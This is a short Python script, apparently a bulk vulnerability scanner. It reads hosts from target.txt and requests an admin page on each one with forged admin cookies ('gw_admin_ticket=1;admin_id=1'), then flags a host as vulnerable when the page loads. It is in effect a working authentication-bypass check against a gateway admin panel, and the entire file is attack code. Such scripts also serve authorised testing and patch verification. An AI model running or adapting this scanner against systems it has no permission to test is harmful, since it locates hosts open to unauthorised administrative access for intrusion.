import requests
import re

url = 'http://{{Hostname}}/admin/group/x_group.php?id=1'

headers = {
    'Cookie': 'gw_admin_ticket=1;admin_id=1',
    'User-Agent': 'Mozilla/5.0 (Jaky; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close'
}

matchers = {
    'status': [200],
    'regex': ['form1.*']
}

with open('target.txt', 'r') as f:
    targets = [line.strip() for line in f.readlines()]

for target in targets:
    try:
        r = requests.get(url.replace('{{Hostname}}', target), headers=headers)
        if all([r.status_code == s for s in matchers['status']]) and \
                all([re.search(p, r.text) for p in matchers['regex']]):
            print(f'{target}: Vulnerable')
        else:
            print(f'{target}: Not Vulnerable')
    except:
        print(f'{target}: Error occurred during request')
